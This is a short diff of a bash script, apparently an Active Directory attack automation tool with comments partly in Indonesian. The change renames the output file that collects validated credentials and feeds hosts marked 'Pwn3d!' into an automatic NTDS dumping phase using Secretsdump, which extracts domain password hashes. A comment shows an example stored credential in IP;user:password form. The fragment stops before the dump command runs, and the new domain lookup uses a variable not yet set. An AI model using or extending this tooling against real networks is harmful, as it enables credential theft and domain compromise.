@@ -452,9 +452,9 @@ else
     echo -e "${YELLOW}[!] No summary records found.${NC}"
 fi
 # =================================================================
-# EXTRACTION: UNIQUE VALID CREDENTIALS TO Final_valid_creds.txt
+# EXTRACTION: UNIQUE VALID CREDENTIALS TO Final_valid_creds_all.txt
 # =================================================================
-FINAL_CREDS_FILE="$OUTDIR/final_valid_creds_$DOMAIN.txt"
+FINAL_CREDS_FILE="$OUTDIR/final_valid_creds_all.txt"
 : > "$FINAL_CREDS_FILE"
 
 if [[ -s "$FINAL_OUT" ]]; then
@@ -472,14 +472,16 @@ if [[ -s "$FINAL_OUT" ]]; then
         echo -e "${GRAY}------------------------------------------------------------${NC}"
     fi
 fi
+
 #====================================================
 # PHASE 5: AUTOMATIC NTDS DUMPING (Secretsdump)
 #====================================================
 # Pastikan file kredensial ada dan berisi data sebelum dilanjutkan
-if [[ -s "$OUTDIR/final_valid_creds_$DOMAIN.txt" ]]; then
+if [[ -s "$OUTDIR/final_valid_creds_all.txt" ]]; then
     
     # Ambil baris yang memiliki status pwn3d atau sukses
-    grep -i "Pwn3d!" "$OUTDIR/final_valid_creds_$DOMAIN.txt" | sort -u | while IFS=; read -r cred_line; do
+    grep -i "Pwn3d!" "$OUTDIR/final_valid_creds_all.txt" | sort -u | while IFS=; read -r cred_line; do
+    DOMAIN=$(get_domain "$ip")
         
         # Ekstraksi IP, User, dan Pass dari format simpanan Anda
         # Misal format: 10.0.16.179;ATHENA_SVC:1dirtymartini
